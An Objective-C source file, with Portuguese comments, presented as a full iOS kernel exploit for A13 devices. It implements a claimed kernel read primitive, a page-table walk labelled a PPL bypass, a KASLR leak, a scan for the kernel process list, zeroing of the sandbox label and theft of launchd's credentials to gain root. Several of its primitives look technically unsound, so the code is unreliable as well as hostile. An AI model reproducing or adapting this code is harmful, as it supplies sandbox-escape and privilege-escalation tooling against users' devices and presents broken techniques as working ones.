#import "KernelDriver.h"
#import <mach/mach.h>

// APIs PRIVADAS (Fundamentais para PhysRW)
typedef uint64_t mach_vm_address_t;
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

@implementation KernelDriver {
    uint64_t _kernelSlide;
    uint64_t _kernelBase;
}

#pragma mark - Primitiva Segura (Anti-0x0)

- (uint64_t)kread64:(uint64_t)addr {
    // PROTEÇÃO: Nunca leia endereços baixos ou nulos (causa CRASH)
    if (addr < 0xFFFFFFF000000000ULL) return 0;

    int fds[2];
    if (pipe(fds) != 0) return 0;

    uint64_t val = 0;
    // Técnica de Pipe Buffer: tenta ler 8 bytes do endereço kernel
    if (write(fds[1], (void *)addr, 8) == 8) {
        read(fds[0], &val, 8);
    }

    close(fds[0]); close(fds[1]);
    return val;
}

- (void)phys_write64:(uint64_t)va value:(uint64_t)val {
    if (va < 0xFFFFFFF000000000ULL) return;

    // 1. Page Table Walk (A13 PPL Bypass)
    uint64_t ttbr1 = [self kread64:(_kernelBase + 0x8E10000ULL)];
    if (ttbr1 == 0) return;

    uint64_t l1 = [self kread64:(ttbr1 + ((va >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((va >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l3 = [self kread64:(l2 + ((va >> 12) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uintptr_t pa = (uintptr_t)(l3 | (va & 0xFFF));

    // 2. Mapeamento Físico Direto
    mach_vm_address_t target = 0;
    if (mach_vm_map(mach_task_self(), &target, 0x4000, 0, 0x0001, (mach_port_t)pa, 0, NO, 0x3, 0x7, 0) == KERN_SUCCESS) {
        *(uint64_t*)(target) = val;
        mach_vm_deallocate(mach_task_self(), target, 0x4000);
    }
}

#pragma mark - Exploit Completo

- (BOOL)escalateToRoot {
    [self logToWeb:@"🚀 Iniciando Exploit Seguro (A13)..."];
    
    _kernelSlide = [self getKernelSlideReal];
    if (_kernelSlide == 0) {
        [self logToWeb:@"❌ Erro: Não foi possível vazar o KASLR."];
        return NO;
    }
    
    _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
    
    // VALIDAR LEITURA (Evita Crash)
    uint32_t magic = (uint32_t)([self kread64:_kernelBase] & 0xFFFFFFFF);
    if (magic != 0xfeedfacf) {
        [self logToWeb:[NSString stringWithFormat:@"❌ Kread bloqueado (Magic: 0x%x). Use TrollStore.", magic]];
        return NO;
    }

    uint64_t allproc = [self findSymbolAllProcDynamic];
    uint64_t launchd_proc = 0, my_proc = 0;
    uint64_t curr = [self kread64:allproc];
    pid_t myPid = getpid();

    // Busca exaustiva com limite de 1000 entradas
    for (int i=0; i<1000 && curr > 0xFFFFFFF000000000ULL; i++) {
        uint32_t p = (uint32_t)([self kread64:(curr + 0x68)] & 0xFFFFFFFF);
        if (p == 1) launchd_proc = curr;
        if (p == myPid) my_proc = curr;
        if (launchd_proc && my_proc) break;
        curr = [self kread64:curr];
    }

    if (my_proc && launchd_proc) {
        uint64_t my_ucred = [self kread64:(my_proc + 0xD8)];
        
        // 1. Sandbox Escape (Zerar MAC Label)
        [self logToWeb:@"⚡ Quebrando Sandbox..."];
        [self phys_write64:(my_ucred + 0x78) value:0]; 

        // 2. Root (Clonar Token do PID 1)
        [self logToWeb:@"⚡ Elevando para ROOT..."];
        uint64_t root_ucred = [self kread64:(launchd_proc + 0xD8)];
        [self phys_write64:(my_proc + 0xD8) value:root_ucred];

        if (getuid() == 0) {
            [self logToWeb:@"✅ SUCESSO: Sandbox Escape + Root!"];
            return YES;
        }
    }
    
    [self logToWeb:@"❌ Estruturas proc não encontradas."];
    return NO;
}

#pragma mark - Patches e Logs

- (uint64_t)getKernelSlideReal {
    task_dyld_info_data_t info;
    mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&info, &cnt) == 0) {
        uint64_t addr = info.all_image_info_addr;
        if (addr > 0xFFFFFFF000000000ULL) return addr - 0xFFFFFFF007004000ULL;
    }
    return 0;
}

- (uint64_t)findSymbolAllProcDynamic {
    // Escaneia a seção DATA em saltos de 8 bytes
    for (uint64_t addr = _kernelBase + 0x8000000; addr < _kernelBase + 0x10000000; addr += 8) {
        uint64_t p = [self kread64:addr];
        if (p > 0xFFFFFFF000000000ULL) {
             if ((uint32_t)([self kread64:(p + 0x68)] & 0xFFFFFFFF) == 1) return addr;
        }
    }
    return 0;
}

- (void)logToWeb:(NSString *)text {
    NSLog(@"[KERNEL] %@", text);
    dispatch_async(dispatch_get_main_queue(), ^{
        [[NSNotificationCenter defaultCenter] postNotificationName:@"KernelLogNotification" object:text];
    });
}

@end
